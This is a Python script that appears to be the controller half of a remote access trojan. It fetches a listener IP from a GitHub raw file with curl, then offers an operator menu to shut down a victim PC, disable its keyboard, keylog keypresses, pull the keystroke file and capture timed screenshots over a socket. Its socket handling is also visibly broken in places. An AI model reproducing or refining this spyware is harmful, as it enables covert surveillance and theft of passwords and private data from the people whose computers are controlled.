import socket
import os
    # Define the port to listen on (same as server's port)
listen_port = 6969
filename="keys.txt"
ifilename="scrn"
k=0
a=0
argt1=""
bdata=b""
addr2=""
addr1=os.popen("curl https://raw.githubusercontent.com/txt-sys/txt/refs/heads/main/ip.txt").read()
f=len(addr1) -1
for n in addr1:
    if a==f:
        break
    addr2+=n
    a+=1
s=socket.socket()
s.bind((addr2, listen_port))
s.listen()
print("Input option\n1.Shutdown PC\n2.Switch off keyboard\n3.Keylog keypresses\n4.Retrieve txt file with presses\n5.Generate message on screen\n6.Screenshot(input time to take scrnsht and interval time)\nE:Close connection\n")
while True:
	c ,addr=s.accept()
	argt1=""
	option=""
	k=0
	print("Ready")
	option=input()
	while True:
		o=option[0]
		c.send(option.encode())
		if o=='4':
			file = open('keys.txt', 'wb')
			line = s.recv(1024)
			while(line):
				file.write(line)
				line = s.recv(1024)
			print('File has been received successfully.')
			file.close()
			s.close()
			break
		elif o=='6':
			for n in option:
				if n==' ':
					k+=1
				if k==1:
					argt1+=n
				if k==2:
					break
			argtn1=int(argt1)
			for n in range(argtn1):
				ifilename="scrn"
				fnum=str(n)
				ifilename+=fnum
				ifilename+=".jpeg"
				fb=open(ifilename, "wb")
				data=s.recv(400)
				while data:
					sdata=str(data)
					pos=len(sdata)
					if sdata[pos-2]=='9'and sdata[pos-3]=='d' and sdata[pos-4]=='x'and sdata[pos-5]=='\\'and sdata[pos-6]=='f' and sdata[pos-7]=='f' and sdata[pos-8]=='x':
						fb.write(data)
						break
					fb.write(data)
					data=s.recv(400)
				print("Img saved")
				fb.close()
			s.close()
			break
		elif c=='E':
			s.close()
			exit()
		else:
			break

